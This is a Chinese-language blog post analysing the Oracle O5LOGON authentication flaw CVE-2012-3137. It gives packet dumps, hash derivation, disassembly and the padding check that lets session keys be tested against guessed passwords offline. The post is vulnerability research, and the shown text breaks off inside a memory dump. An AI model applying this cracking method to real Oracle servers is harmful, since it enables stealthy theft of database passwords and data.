<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137) | 安全代码</title><meta name="author" content="曼福吉"><meta name="copyright" content="曼福吉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="12345678910111213NSFOCUS ID:    20847BUGTRAQ ID:    55651CVE ID:        CVE-2012-3137远程漏洞：      是本地漏洞：      是漏洞类型：漏洞影响：      远程攻击者可以密码进行离线密码暴力破解危险指数：      高创建时间：      2012-9-27更新时间：攻击代码：      无跟踪工程师：">
<meta property="og:type" content="article">
<meta property="og:title" content="Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)">
<meta property="og:url" content="https://usmacd.com/cn/cve-2012-3137/index.html">
<meta property="og:site_name" content="安全代码">
<meta property="og:description" content="12345678910111213NSFOCUS ID:    20847BUGTRAQ ID:    55651CVE ID:        CVE-2012-3137远程漏洞：      是本地漏洞：      是漏洞类型：漏洞影响：      远程攻击者可以密码进行离线密码暴力破解危险指数：      高创建时间：      2012-9-27更新时间：攻击代码：      无跟踪工程师：">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640">
<meta property="article:published_time" content="2023-09-06T03:00:51.338Z">
<meta property="article:modified_time" content="2023-09-06T03:00:51.338Z">
<meta property="article:author" content="曼福吉">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)",
  "url": "https://usmacd.com/cn/cve-2012-3137/",
  "image": "https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640",
  "datePublished": "2023-09-06T03:00:51.338Z",
  "dateModified": "2023-09-06T03:00:51.338Z",
  "author": [
    {
      "@type": "Person",
      "name": "曼福吉",
      "url": "https://usmacd.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://usmacd.com/cn/cve-2012-3137/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/self/atom-one-light.css"><link rel="stylesheet" href="/self/nord.css"><meta name="generator" content="Hexo 8.1.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
<link rel="alternate" href="/rss.xml" title="安全代码" type="application/rss+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">169</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/thoughts"><i class="fa-fw fas fa-cloud"></i><span> 想法</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><span> sitemap</span></a></div><div class="menus_item"><a class="site-page" href="/random.html"><span> random</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">安全代码</span></a><a class="nav-page-title" href="/"><span class="site-name">Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/thoughts"><i class="fa-fw fas fa-cloud"></i><span> 想法</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><span> sitemap</span></a></div><div class="menus_item"><a class="site-page" href="/random.html"><span> random</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-06T03:00:51.338Z" title="发表于 2023-09-06 11:00:51">2023-09-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-06T03:00:51.338Z" title="更新于 2023-09-06 11:00:51">2023-09-06</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">NSFOCUS ID:    20847<br>BUGTRAQ ID:    55651<br>CVE ID:        CVE-2012-3137<br>远程漏洞：      是<br>本地漏洞：      是<br>漏洞类型：<br>漏洞影响：      远程攻击者可以密码进行离线密码暴力破解<br>危险指数：      高<br>创建时间：      2012-9-27<br>更新时间：<br>攻击代码：      无<br><br>跟踪工程师：    zz<br></code></pre></td></tr></table></figure>

<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述:"></a>漏洞概述:</h2><p>Oracle是一款广泛被使用的商业数据库。</p>
<p>Oracle O5LOGON认证协议存在漏洞，这个漏洞可以使攻击者离线暴力破解Oracle数据库密码，<br>从而访问受保护的Oracle数据库中的数据。要利用这个漏洞攻击者只需要知道一个合法的<br>数据库用户名和一个正确的数据库名(SID)，不需要使用中间人攻击。</p>
<p>Martinez Fayo 在2010年5月向Oracle报告了这个问题，Oracle在2011年的中期通过patch<br> set 11.2.0.3修复了这个漏洞，使用了新版本的协议。但是Oracle没有在 11.1和11.2 中<br>修复这个问题，因此这些版本仍然存在漏洞。</p>
<p>由于漏洞发生在认证阶段的早期，获取需要的数据后马上断开连接，不会在Oracle数据库<br>里留下登录日志，因此这个漏洞被称为 “stealth password cracking vulnerability”</p>
<p>细节：</p>
<p>O5LOGON 过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">         send username<br>Client -----------------------------&gt; Server<br><br>         AUTH_SESSKEY  AUTH_VFR_DATA<br>Client &lt;----------------------------  Server<br><br>         AUTH_SESSKEY  AUTH_PASSWORD<br>Clinet -----------------------------&gt; Server<br></code></pre></td></tr></table></figure>

<p>和这个漏洞相关的两个报文，包含了需要的信息, 如下：</p>
<p>(1) Server -&gt; client</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0000   00 f8 00 00 06 00 00 00 00 00 08 02 00 0c 00 00  ................<br>0010   00 0c 41 55 54 48 5f 53 45 53 53 4b 45 59 60 00  ..AUTH_SESSKEY`.<br>0020   00 00 60 35 32 46 43 30 34 42 31 46 46 38 31 31  ..`52FC04B1FF811<br>0030   30 43 41 31 32 36 33 44 46 35 42 43 36 31 41 37  0CA1263DF5BC61A7<br>0040   45 35 37 37 34 30 43 38 41 35 31 31 31 44 32 32  E57740C8A5111D22<br>0050   42 34 31 45 35 33 43 43 31 36 37 46 44 46 32 41  B41E53CC167FDF2A<br>0060   36 38 37 38 39 35 38 32 30 30 44 39 42 32 42 36  6878958200D9B2B6<br>0070   41 35 31 43 39 35 44 37 37 39 46 44 45 42 41 42  A51C95D779FDEBAB<br>0080   42 36 39 00 00 00 00 0d 00 00 00 0d 41 55 54 48  B69.........AUTH<br>0090   5f 56 46 52 5f 44 41 54 41 14 00 00 00 14 34 33  _VFR_DATA.....43<br>00a0   45 30 42 45 32 30 42 33 32 42 30 42 42 37 36 45  E0BE20B32B0BB76E<br>00b0   35 37 25 1b 00 00 04 01 00 00 00 02 00 00 00 00  57%.............<br>00c0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................<br>00d0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................<br>00e0   00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00  ................<br>00f0   00 00 00 00 00 00 00 00                          ........<br></code></pre></td></tr></table></figure>


<p>(2) server &lt;- client</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0000   03 73 03 d0 1a 05 0a 09 00 00 00 21 01 00 00 44  .s.........!...D<br>0010   46 bf bf 0d 00 00 00 ec 42 bf bf d8 53 bf bf 03  F.......B...S...<br>0020   73 79 73 24 00 00 00 0c 41 55 54 48 5f 53 45 53  sys$....AUTH_SES<br>0030   53 4b 45 59 20 01 00 00 fe 40 46 41 36 44 43 44  SKEY ....@FA6DCD<br>0040   30 46 33 38 39 45 39 32 44 31 38 46 38 31 38 38  0F389E92D18F8188<br>0050   45 43 36 39 33 31 33 42 35 32 34 46 34 32 31 31  EC69313B524F4211<br>0060   38 34 46 41 45 36 37 39 36 31 33 41 37 32 46 43  84FAE679613A72FC<br>0070   38 44 46 44 30 41 34 43 37 42 20 42 39 33 41 36  8DFD0A4C7B B93A6<br>0080   41 43 42 38 45 30 35 42 38 32 35 38 41 30 32 30  ACB8E05B8258A020<br>0090   44 32 39 35 34 45 43 31 42 36 33 00 01 00 00 00  D2954EC1B63.....<br>00a0   27 00 00 00 0d 41 55 54 48 5f 50 41 53 53 57 4f  &#x27;....AUTH_PASSWO<br>00b0   52 44 c0 00 00 00 40 32 43 35 46 39 35 37 41 36  RD....@2C5F957A6<br>00c0   35 33 32 41 44 39 31 44 39 31 36 46 34 45 35 46  532AD91D916F4E5F<br>00d0   41 37 44 32 46 44 41 30 45 36 43 44 46 46 42 41  A7D2FDA0E6CDFFBA<br>00e0   41 45 44 38 38 33 43 41 46 34 46 32 30 30 43 38  AED883CAF4F200C8<br>00f0   39 38 33 41 45 33 44 00 00 00 00 18 00 00 00 08  983AE3D.........<br>0100   41 55 54 48 5f 52 54 54 0f 00 00 00 05 36 36 37  AUTH_RTT.....667<br>0110   30 38 00 00 00 00 27 00 00 00 0d 41 55 54 48 5f  08....&#x27;....AUTH_<br>0120   43 4c 4e 54 5f 4d 45 4d 0c 00 00 00 04 34 30 39  CLNT_MEM.....409<br>0130   36 00 00 00 00 27 00 00 00 0d 41 55 54 48 5f 54  6....&#x27;....AUTH_T<br>0140   45 52 4d 49 4e 41 4c 12 00 00 00 06 70 74 73 2f  ERMINAL.....pts/<br>0150   31 38 00 00 00 00 2d 00 00 00 0f 41 55 54 48 5f  18....-....AUTH_<br>0160   50 52 4f 47 52 41 4d 5f 4e 4d 51 00 00 00 1b 73  PROGRAM_NMQ....s<br>0170   71 6c 70 6c 75 73 40 68 65 6e 69 63 65 73 20 28  qlplus@henices (<br>0180   54 4e 53 20 56 31 2d 56 33 29 00 00 00 00 24 00  TNS V1-V3)....$.<br>0190   00 00 0c 41 55 54 48 5f 4d 41 43 48 49 4e 45 15  ...AUTH_MACHINE.<br>01a0   00 00 00 07 68 65 6e 69 63 65 73 00 00 00 00 18  ....henices.....<br>01b0   00 00 00 08 41 55 54 48 5f 50 49 44 0c 00 00 00  ....AUTH_PID....<br>01c0   04 36 32 32 38 00 00 00 00 18 00 00 00 08 41 55  .6228.........AU<br>01d0   54 48 5f 53 49 44 15 00 00 00 07 68 65 6e 69 63  TH_SID.....henic<br>01e0   65 73 00 00 00 00 18 00 00 00 08 41 55 54 48 5f  es.........AUTH_<br>01f0   41 43 4c 0c 00 00 00 04 34 34 30 30 00 00 00 00  ACL.....4400....<br>0200   36 00 00 00 12 41 55 54 48 5f 41 4c 54 45 52 5f  6....AUTH_ALTER_<br>0210   53 45 53 53 49 4f 4e 6f 00 00 00 25 41 4c 54 45  SESSIONo...%ALTE<br>0220   52 20 53 45 53 53 49 4f 4e 20 53 45 54 20 54 49  R SESSION SET TI<br>0230   4d 45 5f 5a 4f 4e 45 3d 27 2b 30 38 3a 30 30 27  ME_ZONE=&#x27;+08:00&#x27;<br>0240   00 01 00 00 00 45 00 00 00 17 41 55 54 48 5f 4c  .....E....AUTH_L<br>0250   4f 47 49 43 41 4c 5f 53 45 53 53 49 4f 4e 5f 49  OGICAL_SESSION_I<br>0260   44 60 00 00 00 20 43 41 41 38 39 33 41 43 30 41  D`... CAA893AC0A<br>0270   34 33 30 46 41 30 45 30 34 30 30 30 37 46 30 31  430FA0E040007F01<br>0280   30 31 31 38 35 34 00 00 00 00 30 00 00 00 10 41  011854....0....A<br>0290   55 54 48 5f 46 41 49 4c 4f 56 45 52 5f 49 44 00  UTH_FAILOVER_ID.<br>02a0   00 00 00 00 00 00 00                             .......<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AUTH_SESSKEY_SRV: 52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69<br>AUTH_SESSKEY_CLI: FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63<br>AUTH_PASSWORD   : 2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D<br>AUTH_VFR_DATA   : 43E0BE20B32B0BB76E57<br></code></pre></td></tr></table></figure>

<h2 id="Oracle-O5LOGON-协议介绍"><a href="#Oracle-O5LOGON-协议介绍" class="headerlink" title="Oracle O5LOGON 协议介绍"></a>Oracle O5LOGON 协议介绍</h2><p>Oracle 11g password hash 算法为, 用户名 sys, 密码 nsfocus</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-meta">&gt;&gt;&gt; </span>hashlib.sha1(<span class="hljs-string">&#x27;nsfocus&#x27;</span> + <span class="hljs-string">&#x27;\x43\xE0\xBE\x20\xB3\x2B\x0B\xB7\x6E\x57&#x27;</span>).hexdigest()<br><span class="hljs-string">&#x27;c3d98762d258d4bd92c572065ddea9af38123f88&#x27;</span><br></code></pre></td></tr></table></figure>

<p>可以在Oracle数据中查询:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> name, password, spare4 <span class="hljs-keyword">from</span> sys.user$ <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SYS&#x27;</span>;<br><br>NAME                   PASSWORD<br><span class="hljs-comment">------------------------------ ------------------------------</span><br>SPARE4<br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br>SYS                <span class="hljs-number">0</span>F2417000362F55F<br>S:C3D98762D258D4BD92C572065DDEA9AF38123F8843E0BE20B32B0BB76E57<br><br>password hash： C3D98762D258D4BD92C572065DDEA9AF38123F88<br>salt         ： <span class="hljs-number">43E0</span>BE20B32B0BB76E57<br></code></pre></td></tr></table></figure>

<ol>
<li>client 发送用户名给server<br>2  server 判断是否是可用的用户名，如果用户名可用，进入下一步。</li>
<li>Server 加密AUTH_SESSKEY,  取出 salt</li>
</ol>
<p>使用AES192 CBC 加密AUTH_SESSKEY, key为oralce数据库中的20字节的password hash和4个<br>零(192bit)。</p>
<ol start="4">
<li><p>Server 将加密的AUTH_SESSKEY和AUTH_VFR_DATA 发送给Client<br>AUTH_VFR_DATA 为salt</p>
</li>
<li><p>Client计算password hash (通过用户输入的密码), 使用Client计算的password hash<br>(加上4个零)为key 使用AES192 CBC算法加密Client AUTH_SESSKEY</p>
</li>
<li><p>Client 计算 Combine_SessKey<br>将解密的Server AUTH_SESSKEY 和 Client AUTH_SESSKEY的第17个字节开始的24个字节做异<br>或，将异或结果的前16字节做MD5, 后8字节做MD5, 得到Combine_SessKey</p>
</li>
<li><p>Client 使用 Combine_SessKey 加密用户输入的密码明文，得到 AUTH_PASSWORD<br>使用算法为AES192 CBC</p>
</li>
<li><p>Client 将加密的Client AUTH_SESSKEY和加密的AUTH_PASSWORD 发送给 Server</p>
</li>
<li><p>Server 使用数据库中的 password hash 解密 Client AUTH_SESSKEY</p>
</li>
<li><p>Server 尝试解密AUTH_PASSWORD 解密成功则认证通过</p>
</li>
</ol>
<p>参看:<br><a target="_blank" rel="noopener" href="http://www.oxid.it/downloads/oracle_tns_aes192_check.txt">http://www.oxid.it/downloads/oracle_tns_aes192_check.txt</a></p>
<p>这个漏洞是生成server sesskey 时，在末尾添加了8个0x08, 因为salt已知（由服务器返回<br>），因此我们只需尝试计算SHA-1的password hash，然后利用这个password hash 去解密<br>server sesskey， 只要末尾是8个0x08 则说明这是正确的server sesskey，此时使用的密<br>码为正确的密码，原因是</p>
<p>AES 192 加密块长度为128 bit (16 byte), 分组加密如果明文内容不是块长度的整数倍时<br>需要填充。填充部分的内容为差的字节数，比如11字节的明文，需要在末尾填充5个0x5</p>
<p>从汇编代码里分析server session key 的生成过程，分析的程序为 Oracle.exe 11.2.0.1.0<br>oracle.exe调用 oran11.ztvo5ke 加密session key</p>
<p>oran11.ztvo5ke -&gt; oracrypt11.ztceenc  -&gt; orancrypt11.ztcen</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">e_key</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> s[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[<span class="hljs-number">100</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sess_key</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> type;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[<span class="hljs-number">40</span>];<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pwd_hash</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> unknown1;<br>    <span class="hljs-type">uint32_t</span> hash_len;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> hash[<span class="hljs-number">20</span>];<br>&#125;<br><br>ztvo5ke ( e_key*, sess_key*, pwd_hash*, <span class="hljs-type">int</span>);<br></code></pre></td></tr></table></figure>
<p>sess_key.type &#x3D;&#x3D; 0x1492 ( AES 192 )</p>
<p>plaintext    24  + 16 &#x3D; 40 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:101BC481                 push    eax        ; unknown structure<br>.text:101BC482                 push    edx        ; encrypted session key<br>.text:101BC483                 push    28h        ; length<br>.text:101BC485                 push    ecx        ; plaintext session key<br>.text:101BC486                 push    0<br>.text:101BC488                 push    ebx        ; 0x18<br>.text:101BC489                 push    87004001h<br>.text:101BC48E                 call    ztceenc    ; AES 192<br>.text:101BC493                 add     esp, 1Ch<br>.text:101BC496                 mov     ebx, eax<br>.text:101BC498                 test    ebx, ebx<br>.text:101BC49A                 jnz     short loc_101BC4B8<br>.text:101BC49C                 lea     edx, [ebp+var_A4]<br>.text:101BC4A2                 lea     eax, [edi+2]<br>.text:101BC4A5                 push    eax       ; e_key+2<br>.text:101BC4A6                 push    [ebp+var_C8]<br>.text:101BC4AC                 push    edx       ; encryted session key<br>.text:101BC4AD                 call    ztucbtx<br></code></pre></td></tr></table></figure>

<p>ztceenc  运行前后的情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0DC3A4E4                                      40 00 00 00                       <br>0DC3A4F4  00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00..                        <br>0DC3A504  0C 4A FE 0C 02 00 00 00 FF FF FF FF 13 00 00 00..                        <br>0DC3A514  02 00 00 00 00 00 00 00 14 00 00 00 14 00 00 00..                     <br>0DC3A524  44 94 3E 10 00 00 00 00 00 00 00 00 00 00 00 00..                        <br>0DC3A534  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        <br>0DC3A544  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        <br>0DC3A554  7A EF 5B 9E 89 D3 9F 07 62 A8 83 BB C6 4D 9F D9..                        <br>0DC3A564  EA 7B 90 1C 49 9B 73 36 BE 60 AF F6 69 A4 ED 37..                        